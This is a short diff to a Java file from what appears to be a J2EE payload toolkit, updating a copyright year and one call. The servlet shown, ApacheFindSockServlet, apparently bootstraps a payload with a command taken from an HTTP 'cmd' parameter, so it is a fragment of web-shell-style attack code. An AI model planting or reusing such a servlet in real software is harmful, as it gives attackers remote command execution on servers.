@@ -1,7 +1,7 @@
 /*
  * J2EE Payloads.
  * 
- * Copyright (c) 2010, Michael 'mihi' Schierl
+ * Copyright (c) 2010, 2011 Michael 'mihi' Schierl
  * All rights reserved.
  * 
  * Redistribution and use in source and binary forms, with or without
@@ -246,7 +246,7 @@ public class ApacheFindSockServlet extends HttpServlet {
 		out.write(2);
 		out.flush();
 		try {
-			new LocalTest(in, out).bootstrap(request.getParameter("cmd").split(" "));
+			new LocalTest(in, out).bootstrap(request.getParameter("cmd").split(" "), false);
 		} catch (Exception ex) {
 			ex.printStackTrace(new PrintStream(out));
 			out.flush();
